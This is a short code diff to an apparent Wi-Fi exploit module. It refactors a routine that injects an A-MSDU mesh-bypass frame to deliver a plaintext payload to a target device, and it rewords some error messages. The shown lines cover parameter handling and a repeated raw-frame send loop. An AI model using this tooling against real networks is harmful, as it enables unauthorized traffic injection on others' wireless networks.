@@ -242,6 +242,11 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        print_success("Pre-conditions satisfied; launching exploit")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: inject A-MSDU mesh bypass frame to deliver plaintext payload."""
         iface = str(self.interface).strip()
         bssid_str = str(self.bssid).strip()
         tgt_mac_str = str(self.target_mac).strip()
@@ -265,7 +270,7 @@ class Exploit(Exploit):
         )
 
         if frame is None:
-            print_error("Frame construction failed -- scapy not installed or invalid parameters")
+            print_error("Frame construction failed: scapy not installed or invalid parameters")
             print_info("Install: pip install scapy")
             return
 
@@ -293,7 +298,7 @@ class Exploit(Exploit):
                 print_info(f"  Sent {i + 1}/{repeat}")
                 time.sleep(interval_s)
             except PermissionError:
-                print_error("Permission denied -- run as root or with CAP_NET_RAW")
+                print_error("Permission denied: run as root or with CAP_NET_RAW")
                 return
             except Exception as exc:
                 print_error(f"Send error: {exc}")
